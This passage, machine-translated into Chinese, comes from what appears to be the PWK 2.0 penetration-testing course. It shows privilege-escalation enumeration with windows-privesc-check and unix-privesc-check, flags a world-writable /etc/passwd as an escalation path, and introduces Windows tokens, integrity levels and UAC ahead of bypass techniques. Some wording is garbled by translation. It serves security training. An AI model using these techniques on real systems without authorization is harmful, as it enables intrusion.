<div style="position:absolute;top:113401;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Users 有成员：NT AUTHORITY\Authenticated Users</font></font></b></nobr></div>
<div style="position:absolute;top:113418;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Users 有成员：CLIENT251\student</font></font></b></nobr></div>
<div style="position:absolute;top:113435;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BUILTIN\Users 有成员：[unknown]\S-1-5-21-2715734670-1758985447-1278008508-513</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 检查完成</font></font></nobr></div>
<div style="position:absolute;top:113471;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 551 - windows-privesc-check 输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本成功执行，我们会看到有关安全性的信息</font></font></nobr></div>
<div style="position:absolute;top:113520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统上的组。</font></font></nobr></div>
<div style="position:absolute;top:113553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到类似</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows的privesc检查</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows上的目标，我们也可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unix_privesc_check </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">492</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上</font></font></nobr></div>
<div style="position:absolute;top:113572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UNIX 衍生产品，如 Linux。</font><font style="vertical-align: inherit;">我们可以通过不加任何脚本运行脚本来查看工具帮助</font></font></nobr></div>
<div style="position:absolute;top:113592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">论据。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./unix-privesc-check</font></font></font></b></nobr></div>
<div style="position:absolute;top:113643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )</font></font></nobr></div>
<div style="position:absolute;top:113677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：unix-privesc-check {</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">详细</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:113711;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“标准”模式：对大量安全设置进行速度优化检查。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“详细”模式：与标准模式相同，但也会检查打开文件的权限</font></font></nobr></div>
<div style="position:absolute;top:113762;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理和调用文件（例如从 shell 脚本解析，</font></font></nobr></div>
<div style="position:absolute;top:113779;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接的 .so 文件）。</font><font style="vertical-align: inherit;">这种模式速度慢，容易出错</font></font></nobr></div>
<div style="position:absolute;top:113796;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">积极的，但可能会帮助你找到第三个更微妙的缺陷</font></font></nobr></div>
<div style="position:absolute;top:113813;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">派对节目。</font></font></nobr></div>
<div style="position:absolute;top:113847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此脚本检查文件权限和其他可能允许的设置</font></font></nobr></div>
<div style="position:absolute;top:113864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地用户升级权限。</font></font></nobr></div>
<div style="position:absolute;top:113881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:113900;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 552 - 运行 unix_privesc_check</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如上表所示，该脚本支持“标准”和“详细”模式。</font><font style="vertical-align: inherit;">基于</font></font></nobr></div>
<div style="position:absolute;top:113949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供的信息，标准模式似乎执行速度优化的过程和</font></font></nobr></div>
<div style="position:absolute;top:113968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该减少误报的数量。</font><font style="vertical-align: inherit;">因此，在下面的示例中，我们将使用</font></font></nobr></div>
<div style="position:absolute;top:113988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准模式并将整个输出重定向到一个名为 output.txt 的文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./unix-privesc-check 标准 &gt; output.txt</font></font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:114095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">492 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Pentest Money，2019 年），http://pentestmonkey.net/tools/audit/unix-privesc-check</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:114223;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="97"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 97 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:114256;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:115333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:115333;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:115333;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">538</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114352;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 553 - 运行 unix_privesc_check</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该脚本对常见文件的权限执行多次检查。</font><font style="vertical-align: inherit;">例如，以下</font></font></nobr></div>
<div style="position:absolute;top:114400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">摘录揭示了非 root 用户可写的配置文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查可写的配置文件</font></font></nobr></div>
<div style="position:absolute;top:114452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">##########################################</font></font></nobr></div>
<div style="position:absolute;top:114469;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查除 root 之外的任何人是否可以更改 /etc/passwd</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:114486;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：/etc/passwd 是一个关键的配置文件。</font><font style="vertical-align: inherit;">为 /etc/passwd 设置世界写入</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114503;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查除 root 之外的任何人是否可以更改 /etc/group</font></font></nobr></div>
<div style="position:absolute;top:114520;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查除 root 之外的任何人是否可以更改 /etc/fstab</font></font></nobr></div>
<div style="position:absolute;top:114537;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查除 root 之外的任何人是否可以更改 /etc/profile</font></font></nobr></div>
<div style="position:absolute;top:114554;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查除 root 之外的任何人是否可以更改 /etc/sudoers</font></font></nobr></div>
<div style="position:absolute;top:114571;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查除 root 之外的任何人是否可以更改 /etc/shadow</font></font></nobr></div>
<div style="position:absolute;top:114590;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 554 - unix_privesc_check 可写配置文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此输出显示系统上的任何人都可以编辑 /etc/passwd 文件！</font><font style="vertical-align: inherit;">这是相当重要的</font></font></nobr></div>
<div style="position:absolute;top:114639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为它允许攻击者轻松提升他们的权限</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">493</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或在目标上创建用户帐户。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:114659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">稍后将在模块中演示这一点。</font></font></nobr></div>
<div style="position:absolute;top:114691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管这些工具执行许多自动检查，但请记住，每个系统都是不同的，</font></font></nobr></div>
<div style="position:absolute;top:114711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些类型的工具通常会错过独特的一次性系统更改。</font><font style="vertical-align: inherit;">为此原因，</font></font></nobr></div>
<div style="position:absolute;top:114730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重要的是要注意只能通过手动捕获的独特配置</font></font></nobr></div>
<div style="position:absolute;top:114749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">494</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:114784;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用本文中提供的工具和命令检查您的 Windows 和 Linux 客户端</font></font></nobr></div>
<div style="position:absolute;top:114833;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分以便熟悉手动本地枚举技术。</font></font></nobr></div>
<div style="position:absolute;top:114862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 试验不同的 windows-privesc-check 和 unix_privesc_check 选项。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:114898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2 Windows 权限提升示例</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将讨论 Windows 权限、完整性机制和用户帐户控制</font></font></nobr></div>
<div style="position:absolute;top:114960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(UAC)。</font><font style="vertical-align: inherit;">我们将演示 UAC 绕过技术并利用内核驱动程序漏洞，</font></font></nobr></div>
<div style="position:absolute;top:114979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全的文件权限和不带引号的服务路径来提升我们对目标的权限。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:115013;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:115013;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解 Windows 权限和完整性级别</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 操作系统上的</font><font style="vertical-align: inherit;">权限</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">495</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是指特定帐户的权限</font></font></nobr></div>
<div style="position:absolute;top:115071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行与系统相关的本地操作。</font><font style="vertical-align: inherit;">这包括修改文件系统等操作，</font></font></nobr></div>
<div style="position:absolute;top:115090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加用户、关闭系统等。</font></font></nobr></div>
<div style="position:absolute;top:115123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了使这些特权有效，Windows 操作系统使用称为</font></font></nobr></div>
<div style="position:absolute;top:115142;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问令牌</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">496</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户通过身份验证后，Windows 会生成一个访问令牌，该令牌是</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:115223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">493 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Raj Chandel，2018 年），https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/</font></font></font></nobr></div>
<div style="position:absolute;top:115243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">494 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（G0tmi1k，2011），https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</font></font></font></nobr></div>
<div style="position:absolute;top:115263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">495 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/aa379306 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:115283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">496 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:115411;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="98"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 98 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:115444;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:116521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:116521;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:116521;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">539</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分配给该用户。</font><font style="vertical-align: inherit;">令牌本身包含各种有效的信息</font></font></nobr></div>
<div style="position:absolute;top:115559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述给定用户的安全上下文，包括用户权限。</font></font></nobr></div>
<div style="position:absolute;top:115592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，鉴于它们包含的信息，这些令牌需要是唯一可识别的。</font><font style="vertical-align: inherit;">这是</font></font></nobr></div>
<div style="position:absolute;top:115611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全标识符</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或 SID 完成，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">497</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是分配给每个的唯一值</font></font></nobr></div>
<div style="position:absolute;top:115631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象（包括令牌），例如用户或组帐户。</font></font></nobr></div>
<div style="position:absolute;top:115664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些 SID 由 Windows 本地安全机构生成和维护。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">498</font></font></font></nobr></div>
<div style="position:absolute;top:115696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了特权之外，Windows 还实现了所谓的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完整性机制</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">499</font></font></font></nobr></div>
<div style="position:absolute;top:115715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是 Windows 安全体系结构的核心组件，通过分配</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完整性来工作</font></font></i></nobr></div>
<div style="position:absolute;top:115735;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">级别</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">500</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到应用程序进程和安全对象。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">501</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单的说，这个描述的水平</font></font></nobr></div>
<div style="position:absolute;top:115754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信任操作系统在运行应用程序或安全对象方面的信任。</font><font style="vertical-align: inherit;">例如，</font></font></nobr></div>
<div style="position:absolute;top:115773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置的完整性级别决定了应用程序可以执行哪些操作，包括能够</font></font></nobr></div>
<div style="position:absolute;top:115793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取或写入本地文件系统。</font><font style="vertical-align: inherit;">API 也可以从特定的完整性级别被阻止。</font></font></nobr></div>
<div style="position:absolute;top:115826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 Windows Vista 开始，进程在四个完整性级别上运行：</font></font></nobr></div>
<div style="position:absolute;top:115859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:115859;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统完整性进程：SYSTEM权限</font></font></nobr></div>
<div style="position:absolute;top:115887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:115887;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高完整性流程：管理权限</font></font></nobr></div>
<div style="position:absolute;top:115915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:115915;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中等完整性流程：标准用户权限</font></font></nobr></div>
<div style="position:absolute;top:115944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:115944;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">低完整性进程：在沙盒</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">502</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程中</font><font style="vertical-align: inherit;">经常使用非常受限的权限</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:115978;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:115978;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户控制 (UAC) 简介</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116016;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户控制 (UAC) </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">503</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 Microsoft 随 Windows 引入的访问控制系统</font></font></nobr></div>
<div style="position:absolute;top:116036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vista 和 Windows Server 2008。 虽然 UAC 已经被讨论和调查了很长时间</font></font></nobr></div>
<div style="position:absolute;top:116055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，重要的是要强调微软不认为它是一个安全边界。</font></font></nobr></div>
<div style="position:absolute;top:116074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相反，UAC 强制应用程序和任务在非管理帐户的上下文中运行</font></font></nobr></div>
<div style="position:absolute;top:116093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直到管理员授权提升访问权限。</font><font style="vertical-align: inherit;">它将阻止安装程序和未经授权的</font></font></nobr></div>
<div style="position:absolute;top:116113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序在没有管理帐户权限的情况下运行并且还会阻止</font></font></nobr></div>
<div style="position:absolute;top:116132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改系统设置。</font><font style="vertical-align: inherit;">一般来说，UAC 的效果是任何希望</font></font></nobr></div>
<div style="position:absolute;top:116151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行具有潜在系统范围影响的操作，不能静默执行。</font><font style="vertical-align: inherit;">至少在理论上。</font></font></nobr></div>
<div style="position:absolute;top:116184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同样重要的是要强调 UAC 有两种不同的模式：凭据提示和</font></font></nobr></div>
<div style="position:absolute;top:116204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同意提示。</font><font style="vertical-align: inherit;">区别很简单。</font><font style="vertical-align: inherit;">当标准用户希望执行</font></font></nobr></div>
<div style="position:absolute;top:116223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理任务，例如安装新应用程序，并且启用了 UAC，用户将看到</font></font></nobr></div>
<div style="position:absolute;top:116242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据提示。</font><font style="vertical-align: inherit;">换句话说，管理用户的凭据将需要</font></font></nobr></div>
<div style="position:absolute;top:116262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成任务。</font><font style="vertical-align: inherit;">但是，当管理用户尝试执行相同操作时，他或她会</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:116337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">497 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/secauthz/security-identifiers</font></font></font></nobr></div>
<div style="position:absolute;top:116357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">498 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication</font></font></font></nobr></div>
<div style="position:absolute;top:116377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">499 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2007 年），https://msdn.microsoft.com/en-us/library/bb625957.aspx</font></font></font></nobr></div>
<div style="position:absolute;top:116397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">500 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2007 年），https://msdn.microsoft.com/en-us/library/bb625963.aspx</font></font></font></nobr></div>
<div style="position:absolute;top:116417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">501 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/secauthz/securable-objects</font></font></font></nobr></div>
<div style="position:absolute;top:116437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">502 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Sandbox_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(software_development)</font></font></font></nobr></div>
<div style="position:absolute;top:116457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">503 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:116472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制概览 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:116599;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="99"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 99 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:116632;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:117709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
